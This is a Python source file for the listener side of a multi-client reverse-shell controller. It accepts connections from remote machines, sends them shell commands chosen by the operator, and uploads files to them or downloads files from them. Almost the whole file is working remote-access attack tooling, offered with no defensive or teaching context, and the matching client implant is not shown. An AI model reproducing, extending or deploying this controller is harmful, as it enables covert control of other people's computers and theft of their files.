import socket
from rich.progress import Progress
from threading import Thread
import os
import time



green = '\033[1;32m'
red =  '\033[1;31m'
white ='\033[1;0m'
blue = '\033[1;34m'
violet = '\033[1;35m'
black = '\033[1;30m'
yellow = '\033[1;33m'



HOST = input('enter host: ')
PORT = 2222

clientList = []
clientAdList = []

def printinfo(text):
    mark = blue+'['+red+'*'+blue+'] '
    label = mark+green+text+white
    print(label)



def download(server):
    filename = input(blue+'file name> ')
    try:
        name = os.path.split(filename)[1]
    except:
        name = filename
    server.send(filename.encode())
    filesize = int(server.recv(1025*1024*5).decode())

    with open(name , 'wb') as file :
        with Progress() as p:
            t = p.add_task(description=f'[blue][Downloading] {filename} ',total=filesize)
            totalreceivedd = 0
            while totalreceivedd<filesize:
                data = server.recv(1024*1024*50)

                file.write(data)
                p.advance(t, len(data))
                totalreceivedd+=len(data)







def upload(server):
    filename = input(blue+'filename > ')
    path = input(blue+'Upload destination > ')
    fullpath = os.path.join(path , filename)
    server.send(fullpath.encode())
    with open(filename , 'rb') as f:
        with Progress() as p:
            t = p.add_task(description=f'[blue][Uploading] {filename} ',total=os.path.getsize(filename))
            while True:
                chunk = f.read(1024*1024*40)
                if not chunk:
                    break
                else:
                    server.send(chunk)
                    server.recv(1024*1024)
                    p.advance(t , len(chunk))
    server.send(b'')


def recvRes(client):
    n = True
    run = True
    while run:
        res = client.recv(1024*1024*5)
        if n:
            print()
            n = False
        if res == b'code to terminate':
            run = False
        if  not b'code to terminate' in res:
            try:
                if res == b'\n':
                    print()
                else:
                    print(violet+res.decode()+white)
            except:
                try:
                    print(violet+res.decode('cp437')+white ,end='')
                except:
                    print(violet+'\n',res ,white)
        else:
            break

def handleClient():

    currentClient = 0
    while True:
        try:
            cmd = input(f'{red}Shell{blue}{clientAdList[currentClient]}[{currentClient}]){red}>{blue} ')
            try:
                t2.join(0.01)
            except :
                pass
            if 'change' in cmd:
                cmd = cmd.split(' ')
                id = cmd[1]
                currentClient=int(id)
                continue
            elif cmd == 'cls' or cmd == 'clear':
                os.system('cls' if os.name =='nt' else 'clear')

            elif cmd == 'exit' :
                return

            elif not cmd:
                continue
            elif cmd.startswith('ccd'):
                try:
                    direc = cmd.split(' ')[1]
                    os.chdir(direc)
                except Exception as e:
                    print(red,' ' ,e)
            elif cmd.lower() == 'cdir':
                os.system('dir')
            elif cmd =='clist':
                print(f'{violet} Index {blue} ======client=====')
                for id, i in enumerate(clientAdList):
                    printinfo(f'{violet} {id}{blue} {i}')

            else:
                client = clientList[currentClient]
                if cmd == 'upload':
                    try:
                        client.send(b'upload')
                        upload(client)
                    except:
                        printinfo(f'{black}Client is offline!')
                        clientList.pop(currentClient)
                        clientAdList.pop(currentClient)
                        currentClient = 0
                        continue
                elif cmd == 'download':
                    try:
                        client.send(b'download')
                        download(client)
                    except:
                        printinfo(f'{black}Client is offline!')
                        clientList.pop(currentClient)
                        clientAdList.pop(currentClient)
                        currentClient = 0
                        continue

                try:
                    client.send(cmd.encode())
                except:
                    printinfo(f'{black}Client is offline!')
                    clientList.pop(currentClient)
                    clientAdList.pop(currentClient)
                    currentClient = 0
                    continue
                t2 = Thread(target=lambda: recvRes(client))
                t2.daemon = True
                t2.start()
        except Exception as e:
            print(e)
            time.sleep(5)
            handleClient()




def make_server_and_accept():
    first = True
    server = socket.socket()
    server.bind((HOST, PORT))
    server.listen(5)
    printinfo(f'Server listening on host: {HOST} port: {PORT}')
    while True:

        clientSoc , clientAd = server.accept()
        clientList.append(clientSoc)
        clientAdList.append(clientAd)
        print()
        printinfo(f'Get connection from {clientAd}')
        if first:
            t1 = Thread(target =handleClient)
            t1.daemon = True
            t1.start()
            first = False

        else:

            continue




def main():
    t = Thread(target=make_server_and_accept)
    t.daemon = True
    t.start()
    t.join()



if __name__ == "__main__":

    while True:
        try:
         main()
        except Exception as e:
            pass
